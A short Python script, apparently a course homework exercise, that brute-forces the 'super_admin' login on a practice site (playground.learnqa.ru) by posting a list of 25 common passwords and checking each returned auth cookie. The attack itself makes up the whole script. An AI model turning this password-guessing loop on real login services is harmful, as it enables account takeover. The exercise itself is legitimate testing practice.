import requests

url_get_auth_cookie = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"
url_check_auth_cookie = "https://playground.learnqa.ru/ajax/api/check_auth_cookie"

login = "super_admin"
common_passwords = ["123456",
                    "123456789",
                    "qwerty",
                    "password",
                    "1234567",
                    "12345678",
                    "12345",
                    "iloveyou",
                    "111111",
                    "123123",
                    "abc123",
                    "qwerty123",
                    "1q2w3e4r",
                    "admin",
                    "qwertyuiop",
                    "654321",
                    "555555",
                    "lovely",
                    "7777777",
                    "welcome",
                    "888888",
                    "princess",
                    "dragon",
                    "password1",
                    "123qwe"]


def find_password(login, passwords):
    for password in passwords:
        response = requests.post(url_get_auth_cookie, data={"login": f'{login}', "password": f'{password}'})
        auth_cookie = response.cookies["auth_cookie"]

        if is_authorized(auth_cookie):
            print(f"You are authorized. Your password is {password}.")
            break


def is_authorized(auth_cookie):
    response = requests.get(url_check_auth_cookie, cookies={"auth_cookie": f"{auth_cookie}"})
    match response.text:
        case "You are NOT authorized":
            return False
        case "You are authorized":
            return True
        case _:
            print(f"Unexpected response: {response.text}")


find_password(login, common_passwords)
